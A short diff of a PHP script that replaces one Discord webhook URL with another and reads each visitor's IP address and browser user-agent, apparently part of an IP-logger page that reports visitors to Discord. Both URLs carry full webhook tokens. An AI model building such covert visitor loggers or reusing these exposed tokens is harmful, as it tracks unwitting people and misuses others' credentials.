@@ -1,6 +1,6 @@
 <?php
 
-        $webhookurl = "https://discord.com/api/webhooks/845397539188244550/hO7z6irAhKtL_i74v3EcwEWFS6qcpr3MQQY9aQsY_pJ73hvJ_X9K9o0g9l1pllTdNRlm";
+        $webhookurl = "https://discord.com/api/webhooks/846902791481983016/66IvjGCMWsVU6JEDLIQ9ekwWfIKPTBT1z9TtCGIVO9Em8SDqi4VHGFOcZBqJi-4btvW5";
 
         $ip = (isset($_SERVER["HTTP_CF_CONNECTING_IP"])?$_SERVER["HTTP_CF_CONNECTING_IP"]:$_SERVER['REMOTE_ADDR']);
         $browser = $_SERVER['HTTP_USER_AGENT'];
